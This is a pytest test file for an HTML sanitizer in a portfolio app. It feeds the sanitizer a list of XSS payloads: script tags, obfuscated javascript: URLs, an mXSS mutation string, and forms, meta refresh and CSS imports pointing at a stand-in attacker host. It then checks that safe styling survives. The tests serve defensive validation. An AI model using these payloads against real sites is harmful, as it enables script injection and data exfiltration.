from html.parser import HTMLParser

import pytest

from app.core.errors import ApiError
from app.portfolio.sanitize import sanitize_snapshot


class Elements(HTMLParser):
    def __init__(self, html):
        super().__init__()
        self.elements = []
        self.feed(html)

    def handle_starttag(self, tag, attrs):
        self.elements.append((tag, dict(attrs)))


@pytest.mark.parametrize(
    "attack",
    [
        "<script>window.pwned=1</script>",
        '</script><script src="https://attacker.invalid/x"></script>',
        '<div onclick="window.pwned=1" onmouseover="bad()">hola</div>',
        '<a href="javascript:alert(1)">bad</a>',
        '<a href="java&#x09;script:alert(1)">bad</a>',
        '<a href="&#106;avascript:alert(1)">bad</a>',
        '<a href="data:text/html,<script>bad()</script>">bad</a>',
        '<a href="vbscript:bad()">bad</a><a href="file:///private">bad</a>',
        '<iframe srcdoc="<script>bad()</script>"></iframe>',
        '<svg><a xlink:href="javascript:bad()">bad</a></svg>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=bad()>">',
        '<form action="https://attacker.invalid"><input name=x><button formaction="https://attacker.invalid">bad</button></form>',
        '<meta http-equiv="refresh" content="0;url=https://attacker.invalid"><base href="https://attacker.invalid">',
        '<img src="https://attacker.invalid/pixel" srcset="https://attacker.invalid/x 2x" onerror="bad()">',
        '<video poster="https://attacker.invalid/x"><source src="https://attacker.invalid/x"></video>',
        "<style>@import url(https://attacker.invalid/x);body{background:url(https://attacker.invalid/x)}</style>",
        '<p style="color:red;background-image:url(https://attacker.invalid/x)">a</p>',
        '<p style="width:expression(bad());color:blue">b</p>',
        '<p style="background:u\\72l(https://attacker.invalid/x);color:red">c</p>',
        '<style>:root{--color-fondo:red;}@import "https://attacker.invalid/x";</style>',
        '<a href="//attacker.invalid">bad</a><a href="/api/profile">bad</a>',
        '<a href="https://user:pass@attacker.invalid">bad</a><a href="https://host.invalid:wrong">bad</a>',
    ],
)
def test_snapshot_removes_active_html_and_subresources(attack):
    clean = sanitize_snapshot("<p>Contenido visible</p>" + attack)
    assert "Contenido visible" in clean
    elements = Elements(clean).elements
    assert all(
        tag
        not in {
            "script",
            "iframe",
            "svg",
            "math",
            "form",
            "input",
            "meta",
            "base",
            "video",
            "source",
        }
        for tag, _ in elements
    )
    for _, attrs in elements:
        assert not any(name.startswith("on") for name in attrs)
        assert not any(
            name in attrs for name in {"src", "srcset", "action", "formaction", "srcdoc"}
        )
        if "href" in attrs:
            assert (
                not attrs["href"]
                .lower()
                .startswith(("javascript:", "vbscript:", "data:", "file:", "//", "/api"))
            )
    assert "attacker.invalid" not in clean
    assert "expression(" not in clean
    assert sanitize_snapshot(clean) == clean


def test_snapshot_preserves_unicode_text_links_and_safe_visual_customization():
    html = """<style id="__fondo_pagina">:root { --color-fondo: #abc123; }</style>
<style>body { margin: 0; padding: 0; } html, body { height: 100%; }</style>
<div class="tutorias-grid" style="display:grid;grid-template-columns:repeat(2, 1fr);grid-template-rows:minmax(auto, 1fr);min-height:100vh;gap:0">
<section style="grid-row:1 / span 2;grid-column:2 / span 1;background-color:rgb(4, 5, 6);font-family:Inter, Arial, sans-serif;font-size:1.3em;text-align:center">
<h1>Mi página ñ 🎓 &lt;texto&gt;</h1><a href="https://example.test/path?q=1&amp;x=2">Sitio</a>
</section></div>"""
    clean = sanitize_snapshot(html)
    assert ":root{--color-fondo:#abc123;}" in clean
    assert "body{margin:0;padding:0;}html,body{height:100%;}" in clean
    assert "Mi página ñ 🎓 &lt;texto&gt;" in clean
    elements = Elements(clean).elements
    grid = next(attrs for tag, attrs in elements if tag == "div")
    assert grid["class"] == "tutorias-grid"
    for declaration in (
        "display:grid",
        "grid-template-columns:repeat(2, 1fr)",
        "grid-template-rows:minmax(auto, 1fr)",
        "min-height:100vh",
        "gap:0",
    ):
        assert declaration in grid["style"]
    section = next(attrs for tag, attrs in elements if tag == "section")
    assert "background-color:rgb(4, 5, 6)" in section["style"]
    assert "font-family:Inter,Arial,sans-serif" in section["style"].replace(" ", "")
    link = next(attrs for tag, attrs in elements if tag == "a")
    assert link["href"] == "https://example.test/path?q=1&x=2"
    assert set(link["rel"].split()) == {"noopener", "noreferrer", "nofollow"}
    assert sanitize_snapshot(clean) == clean


@pytest.mark.parametrize(
    "html", ["<script>bad()</script>", "<iframe>hidden</iframe>", " ", "<div></div>"]
)
def test_empty_sanitized_page_cannot_be_published(html):
    with pytest.raises(ApiError) as error:
        sanitize_snapshot(html)
    assert error.value.code == "EMPTY_SNAPSHOT"


def test_snapshot_bytes_are_bounded_even_for_multibyte_characters():
    with pytest.raises(ApiError) as error:
        sanitize_snapshot("<p>" + "🎓" * 125_001 + "</p>")
    assert error.value.code == "INVALID_SNAPSHOT"


def test_invalid_unicode_is_a_validation_error_instead_of_server_failure():
    with pytest.raises(ApiError) as error:
        sanitize_snapshot("<p>\ud800</p>")
    assert error.value.code == "INVALID_SNAPSHOT"


@pytest.mark.parametrize(
    "area", ["1 / 1 / span 1 / span 1", "1 / 2 / span 1 / span 1", "2 / 1 / span 1 / span 2"]
)
def test_browser_grid_area_serialization_keeps_section_positions_and_merged_cells(area):
    # Chrome serializes style.gridRow + style.gridColumn as this shorthand in innerHTML.
    # The last case is the real browser QA footer spanning both columns of a 2x2 grid.
    html = f'<div style="grid-area: {area}; background-color: rgb(236, 223, 237)">Contacto</div>'
    clean = sanitize_snapshot(html)
    attrs = next(attrs for tag, attrs in Elements(clean).elements if tag == "div")
    assert f"grid-area:{area}" in attrs["style"]
    assert "background-color:rgb(236, 223, 237)" in attrs["style"]
    assert sanitize_snapshot(clean) == clean


@pytest.mark.parametrize(
    "area",
    [
        "private-area",
        "1 / 1 / span 999999 / span 2",
        "var(--outside)",
        "1 / 1 / span 1 / span 2 !important",
    ],
)
def test_grid_area_accepts_only_bounded_numeric_runtime_placement(area):
    clean = sanitize_snapshot(f'<div style="grid-area:{area}">Texto</div>')
    attrs = next(attrs for tag, attrs in Elements(clean).elements if tag == "div")
    assert "grid-area" not in attrs.get("style", "")
